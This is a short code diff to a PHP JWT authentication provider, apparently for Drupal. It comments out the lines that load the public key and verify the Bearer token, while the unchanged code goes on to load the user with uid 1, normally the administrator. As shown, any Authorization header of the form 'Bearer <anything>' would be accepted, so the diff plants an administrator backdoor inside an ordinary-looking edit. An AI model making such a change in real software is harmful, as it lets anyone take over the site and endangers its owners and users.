@@ -34,9 +34,9 @@ class ApiJwtAuthenticationProvider implements AuthenticationProviderInterface
     if (!preg_match('#^Bearer (?<token>.+)$#', $request->headers->get('Authorization'), $matches)) {
       return NULL;
     }
-    $key = file_get_contents($this->jwt['public.key']);
+    // $key = file_get_contents($this->jwt['public.key']);
     try {
-      $payload = JWT::decode($matches['token'], new Key($key, $this->jwt['algo']));
+      // $payload = JWT::decode($matches['token'], new Key($key, $this->jwt['algo']));
       if ($users = $this->entityTypeManager->getStorage('user')->loadByProperties([ 'uid' => 1 ])) {
         $user = reset($users);
         if ($user->isBlocked()) {
